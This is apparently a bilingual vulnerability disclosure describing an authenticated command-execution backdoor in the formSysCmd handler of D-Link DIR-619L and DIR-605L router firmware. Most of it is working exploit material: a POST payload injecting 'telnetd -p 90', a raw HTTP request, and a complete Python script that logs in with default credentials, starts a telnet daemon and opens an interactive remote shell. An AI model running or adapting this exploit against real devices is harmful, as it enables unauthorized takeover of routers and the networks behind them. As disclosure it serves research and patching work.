```
Dlink model DIR-619L, the latest firmware 2.06B1, there is a backdoor function that can cause any system command to be executed after user authentication
download link: ftp://ftp2.dlink.com/PRODUCTS/DIR-619L/REVB/
Vulnerability location: file:  /bin/boa  function:formSysCmd
The attacker calls this function by sending a post packet to the http://ip/goform/formSysCmd page.
The program will call the system function with the value of syscmd in the post package.
The same problem exists with the latest firmware 2.12B1 on the DIR-605L.
download link:ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-605L/REVB/

```
Post package structure

``` python
postData = {
	'sysCmd':cmd,
	'submit-url':'1234',
	}
response = requests.post('http://192.168.0.1/goform/formSysCmd',data=postData)
``` 
Http message:
``` 
POST /goform/formSysCmd HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.20.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
submit-url=1234&sysCmd=telnetd+-p+90
``` 
The same problem exists with the latest firmware 2.12B1 on the DIR-605L.
download link:ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-605L/REVB/

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/8.png)

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/7.png)





Dlink型号DIR-619L最新固件2.06B1上存在验证身份后命令执行后门。
下载地址：ftp://ftp2.dlink.com/PRODUCTS/DIR-619L/REVB/
攻击者可在验证身份后执行任意的系统命令。
漏洞位置 /bin/boa上的formSysCmd函数。
攻击者通过向http://ip/goform/formSysCmd页面发送post包调用此函数。
程序会将post包中syscmd的值通过sprintf后调用system函数。
Post结构
postData = {
	'sysCmd':cmd,
	'submit-url':'1234',
	}
	response = requests.post('http://192.168.0.1/goform/formSysCmd',data=postData)
http报文:
POST /goform/formSysCmd HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.20.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
submit-url=1234&sysCmd=telnetd+-p+90

型号DIR-605L最新固件2.12B1上同样存在该问题。
下载地址ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-605L/REVB/


 
Script:
``` python
import requests
import sys
import struct
import base64
from pwn import *
ip='192.168.0.1'
port=101
def login(user,password):
	postData = {
	'login_name':'',
	'curTime':'12345',
	'FILECODE':'',
	'VER_CODE':'',
	'VERIFICATION_CODE':'',
	'login_n':user,
	'login_pass':base64.b64encode(password),
	}
	response = requests.post('http://192.168.0.1/goform/formLogin',data=postData)
def syscmd(cmd):
	postData = {
	'sysCmd':cmd,
	'submit-url':'1234',
	}
	response = requests.post('http://192.168.0.1/goform/formSysCmd',data=postData)
def inter():
	p=remote(ip,port)
	p.interactive()
if __name__ == "__main__":
	login('admin','123456')
	syscmd('telnetd -p '+str(port))
	inter()
	
``` 

